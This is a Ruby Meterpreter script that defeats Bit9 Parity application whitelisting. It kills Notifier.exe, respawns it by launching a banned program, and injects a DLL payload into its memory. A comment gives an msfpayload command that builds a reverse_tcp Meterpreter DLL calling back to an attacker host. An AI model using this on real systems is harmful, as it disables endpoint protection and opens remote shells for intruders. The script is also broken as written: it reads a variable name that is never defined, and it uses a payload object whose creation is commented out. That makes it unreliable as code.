# $Id: killwl.rb  2012-01-31 02:00:00 AM
# $Revision: 1
#
# Meterpreter script that injects into Bit9 Parity Application Whitelisting processes
# This takes advantage of a vulnerability in Bit9 Parity 6.1.x where 
# the Notifier.exe process is not protected and trusted to execute from
# Provided by: Curt Shaffer <cshaffer [at] gmail.com>
#
# Prerequisites: You will need to have a DLL payload that you want to use.
# I use Meterpreter well, because it r0x :)
# You will need to have Bit9 Server running and you will need a policy created for your client
# Most likely you will want to have this in lock down mode.
# You will need a stable shell first as well. This script relies on Railgun at this point
# With that said, go over the the Metasploit bug tracker and vote for Jailgun (Java Rail Gun)
# You will then need to start another handler to recieve the connection from your DLL
# You could probably just do this with one multi hander, but I found it's easier to seperate
# for demo purposes.
# Any feedback is welcome
#
@@exec_opts = Rex::Parser::Arguments.new(
	"-h"  => [ false, "Help menu." ]
)
#
# Usage isn't working yet because there is only one option
#
def usage
	print_line("Usage:" + @@exec_opts.usage)
	raise Rex::Script::Completed
end

@@exec_opts.parse(args) { |opt, idx, val|
	case opt
	when "-h"
		usage
	end
}

print_status("Killing Notifier.exe services on the target...")
#
# This was the easiest way I could find to kill a process by name consistentily
#
b9ns = %W{
	notifier.exe	
}

client.sys.process.get_processes().each do |x|
	if (bit9ns.index(x['name'].downcase))
#
# You probably do not need the following I don't think Keeping it here just in case
#		 print_status("Killing off #{x['name']}...")
#
		client.sys.process.kill(x['pid'])
	end
end
#
# Set a delay time to pause when waiting for stuff to happen
#
delay = 5
sleep delay
session = client
#
# You can use this if you want, but I have not implimented it yet
# tempdir = session.fs.file.expand_path("%TEMP%")
# You may want to modify the following directory to match your system
# Note the double back slash here is required otherwise Ruby will not take it literal
#
uploadpath = "C:\\Temp"
#
# You will need to create your DLL and put it in your path or reference the full path
# You can create a DLL like the following:
# msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.1.1 > /tmp/meterpreter.dll
#
sourcepath = File.join(Msf::Config.install_root, "data", "meterpreter.dll")
# 
# Had to do this in this way. Otherwise it seemed that it would not start notifier.exe properly
# Note that I'm using net.exe which I have set as banned in my Bit9 Policy
# You can use this or there are many ways to cause notifier.exe to start. 
# For example, you could just try to kill the parity.exe process and execute a pending file
# if the system is in Seccon 20 or "Lock down" mode
#
begin
	proc = client.sys.process.execute("net.exe")
rescue
#
# Debug crap.You can remove if you want. I do think you need something to happen for the rescue condition
# You could replace this with a delay statement probably
#
	print_status("Hold up")
end
#
# Create a Notifier.exe process again. I found by killing it and starting a new one
# the injection is more stable
#
def create_new_notifier()
	
	newpid = client.sys.process["notifier.exe"]
	return newpid.to_i
end

target_pid = create_new_notifier
#
# Just some status messages to know whats going on
#
print_status("Getting New Notifier.exe PID")
print_status("The new PID of notifier is #{target_pid}")
print_status("Creating payload...")

#
# This is where the injection magic happens
# pay = client.framework.payloads.create("windows/loadlibrary")   
# pay.datastore['DLL'] = uploadpath                                                                        
#
# There may be a better exit function. I'm still palying around with the different options
# to find the most stable one
#
pay.datastore['EXITFUNC'] = 'thread'
raw = pay.generate
print_status("Opening process with PID #{target_pid}...")
proc = client.sys.process.open(target_pid, PROCESS_ALL_ACCESS)
mem = proc.memory.allocate(raw.length + (raw.length % 1024))
print_status("Injecting payload")
proc.memory.write(mem, raw)
print_status("Executing payload and waiting #{delay} seconds...")
proc.thread.create(mem, 0)
sleep delay
#
# At this point you should be seeing a session being created on your handler
#
